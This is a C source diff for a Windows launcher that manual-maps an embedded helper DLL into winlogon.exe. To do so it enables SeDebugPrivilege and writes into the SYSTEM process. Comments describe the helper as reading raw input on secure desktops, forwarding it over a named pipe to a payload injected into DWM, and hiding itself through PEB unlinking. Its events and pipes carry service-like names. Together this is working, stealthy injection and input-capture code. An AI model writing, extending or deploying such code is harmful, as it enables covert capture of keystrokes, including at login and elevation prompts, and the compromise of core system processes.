@@ -457,9 +457,16 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
 /* ── Manual map ───────────────────────────────────────────────── */
 /* Manual-map from raw bytes already in memory. `sourceBytes` may be an
  * embedded-resource pointer or a memcpy of a file -- we take a private
- * copy either way so the caller can free their source. */
+ * copy either way so the caller can free their source.
+ *
+ * v3.0.2 (2026-09-21): `skip_payload_teardown` gates the payload-specific
+ * wait_for_payload_teardown + sweep steps. Set to 1 when mapping the
+ * wl_input helper into winlogon (the helper has its own supersede
+ * mechanism via Global\NetSvcCoord_Halt, and the sweep is dwm-shape-
+ * calibrated). Set to 0 for the DWM payload path (unchanged behavior). */
 static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
-                                 DWORD sourceLen, char *err, size_t err_sz) {
+                                 DWORD sourceLen, char *err, size_t err_sz,
+                                 int skip_payload_teardown) {
     if (!sourceBytes || sourceLen < 0x400) {
         _snprintf(err, err_sz - 1, "bad payload bytes (len=%lu)", sourceLen);
         err[err_sz - 1] = 0;
@@ -523,8 +530,13 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      * This is the ROOT-CAUSE fix for the 2026-07-06 v4.9 DWM crash
      * reproduced live at 1:00 PM EDT -- see docs comment on the
      * inject_is_loaded() rewrite above. Runs unconditionally: cheap
-     * (~0ms) when no payload is alive; ~250-500ms when there is. */
-    wait_for_payload_teardown();
+     * (~0ms) when no payload is alive; ~250-500ms when there is.
+     *
+     * v3.0.2 (2026-09-21): SKIPPED when mapping the helper (winlogon)
+     * -- the helper has a different shutdown protocol (named event
+     * Global\NetSvcCoord_Halt inside its own DllMain) that's signaled
+     * separately by inject_helper_signal_unload(). */
+    if (!skip_payload_teardown) wait_for_payload_teardown();
 
     /* Historically the sweep reclaimed leaked payload regions from prior
      * `--unload` cycles that couldn't self-free (payload's peb_unlink
@@ -578,10 +590,10 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   environment re-enables the old behavior for post-mortem
      *   debugging. Never set this in production. */
     (void)sweep_stale_payload_regions;   /* symbol kept for debug hatch */
-    if (getenv("SVCLDB_ALLOW_SWEEP")) {
+    if (!skip_payload_teardown && getenv("SVCLDB_ALLOW_SWEEP")) {
         slog_writef("launcher.log", "sweep: ENABLED via SVCLDB_ALLOW_SWEEP (DWM crash risk!)");
         sweep_stale_payload_regions(hProc, imageSize);
-    } else {
+    } else if (!skip_payload_teardown) {
         slog_writef("launcher.log",
                     "sweep: skipped (crash-safe default) -- set SVCLDB_ALLOW_SWEEP=1 to re-enable");
     }
@@ -783,7 +795,7 @@ static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
         err[err_sz - 1] = 0;
         return 0;
     }
-    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz);
+    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz, 0 /*payload*/);
     CloseHandle(hProc);
     if (ok) slog_writef("launcher.log", "inject ok (%s) pid=%lu bytes=%lu",
                        src_label ? src_label : "?", pid, len);
@@ -871,4 +883,146 @@ int inject_dwm_payload_from_resource(void *self_v, int resource_id,
         return 0;
     }
     return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
+}
+
+/* ═══════════════════════════════════════════════════════════════════
+ * v3.0.2 (2026-09-21) -- wl_input helper injection into winlogon.exe.
+ *
+ * The helper reads raw input on isolated/secure desktops (where DWM-4
+ * is walled out) and forwards it to the DWM payload over the named
+ * pipe \\.\pipe\NetSvcCoord. It's manual-mapped into winlogon.exe
+ * (SYSTEM, session N, non-PPL, universal). Same shellcode + PE-map
+ * machinery as the payload; different host + no payload teardown.
+ * See wl_input.c for the helper's DllMain + PEB unlink + reader.
+ * ══════════════════════════════════════════════════════════════════ */
+
+/* Winlogon.exe -- find the PID in our INTERACTIVE SESSION.
+ *
+ * There is one winlogon per interactive session; we want the one that
+ * matches our own session id (returned by ProcessIdToSessionId). Injecting
+ * into a different session's winlogon (e.g. session 0 non-interactive)
+ * would land the helper on a desktop we can't reach. */
+unsigned long inject_find_winlogon_pid_in_session(void) {
+    DWORD my_sid = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &my_sid);
+    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
+    unsigned long pid = 0;
+    if (Process32FirstW(h, &pe)) do {
+        if (_wcsicmp(pe.szExeFile, L"winlogon.exe") != 0) continue;
+        DWORD s = 0;
+        if (ProcessIdToSessionId(pe.th32ProcessID, &s) && s == my_sid) {
+            pid = pe.th32ProcessID;
+            break;
+        }
+    } while (Process32NextW(h, &pe));
+    CloseHandle(h);
+    return pid;
+}
+
+/* Helper supersede: set Global\NetSvcCoord_Halt so any existing helper
+ * instance's watch/reader thread sees `superseded()` and exits, then
+ * wait long enough for teardown before we map a fresh copy.
+ *
+ * The helper's DllMain itself SetEvent's this on ATTACH so the same
+ * event does two jobs:
+ *   1. Existing helper reader (called from wait loop) sees SET => exit
+ *   2. Fresh helper DllMain sets it (kick prior), sleeps, RESET's it
+ *
+ * From the launcher, we just SetEvent + short wait. Total budget
+ * ~600ms which comfortably covers the reader's 200ms poll cadence
+ * plus GetMessage return + cleanup. Idempotent -- calling when no
+ * helper is running just creates the event with initial state
+ * signaled, which is harmless (fresh helper will reset it). */
+int inject_helper_signal_unload(void) {
+    int hit = 0;
+    /* New (v3.0.2) event name. */
+    HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\NetSvcCoord_Halt");
+    if (ev) { SetEvent(ev); CloseHandle(ev); hit = 1; }
+    /* Old (pre-v3.0.2) event name -- kicks any LoadLibrary'd helper from
+     * the prior naming era. Safe to remove once everyone has rebooted past
+     * the v3.0.2 transition. */
+    HANDLE evo = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\svcldb_wlinput_stop");
+    if (evo) { SetEvent(evo); CloseHandle(evo); hit = 1; }
+    return hit;
+}
+
+/* Core: manual-map the helper bytes into winlogon. Same PE mapping
+ * machinery as manual_map_from_bytes, but skips the payload-shutdown-
+ * event dance (we use the helper's own Global\NetSvcCoord_Halt). */
+static int inject_helper_from_bytes_common(const BYTE *bytes, DWORD len,
+                                           char *err, size_t err_sz) {
+    if (!bytes || !len || !err) return 0;
+    if (!enable_debug_priv()) {
+        _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    unsigned long pid = inject_find_winlogon_pid_in_session();
+    if (!pid) {
+        _snprintf(err, err_sz - 1, "winlogon.exe not found in this session");
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    /* Kick any existing helper instance -- wait ~600ms for its watch
+     * thread's Sleep(75) + reader's 200ms WM_TIMER cadence to notice
+     * `superseded()` and unwind. */
+    int had_prior = inject_helper_signal_unload();
+    slog_writef("launcher.log",
+                "helper: winlogon.pid=%lu prior_signal=%d -- waiting 600ms for old instance",
+                pid, had_prior);
+    Sleep(600);
+
+    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+                               PROCESS_VM_WRITE | PROCESS_VM_READ |
+                               PROCESS_QUERY_INFORMATION,
+                               FALSE, pid);
+    if (!hProc) {
+        _snprintf(err, err_sz - 1, "OpenProcess(winlogon=%lu): %lu",
+                  pid, GetLastError());
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz,
+                                   1 /*skip payload teardown*/);
+    CloseHandle(hProc);
+    if (ok) slog_writef("launcher.log",
+                       "helper inject ok winlogon.pid=%lu bytes=%lu", pid, len);
+    return ok;
+}
+
+int inject_helper_from_resource(void *self_v, int resource_id,
+                                char *err, size_t err_sz) {
+    HMODULE self = (HMODULE)self_v;
+    if (!self || !err) return 0;
+    HRSRC rsrc = FindResourceA(self, MAKEINTRESOURCEA(resource_id), (LPCSTR)RT_RCDATA);
+    if (!rsrc) {
+        _snprintf(err, err_sz - 1, "FindResource helper id=%d: %lu",
+                  resource_id, GetLastError());
+        err[err_sz - 1] = 0;
+        slog_writef("launcher.log", "helper inject: FindResource FAILED gle=%lu",
+                    GetLastError());
+        return 0;
+    }
+    DWORD sz = SizeofResource(self, rsrc);
+    HGLOBAL hg = LoadResource(self, rsrc);
+    const BYTE *bytes = (const BYTE *)LockResource(hg);
+    slog_writef("launcher.log",
+                "helper inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
+                rsrc, sz, hg, bytes,
+                bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
+    if (!bytes || sz < 0x400) {
+        _snprintf(err, err_sz - 1, "helper resource %d bad (sz=%lu)",
+                  resource_id, sz);
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    if (bytes[0] != 'M' || bytes[1] != 'Z') {
+        _snprintf(err, err_sz - 1, "helper resource %d not a PE (mz=%02X%02X)",
+                  resource_id, bytes[0], bytes[1]);
+        err[err_sz - 1] = 0;
+        return 0;
+    }
+    return inject_helper_from_bytes_common(bytes, sz, err, err_sz);
 }
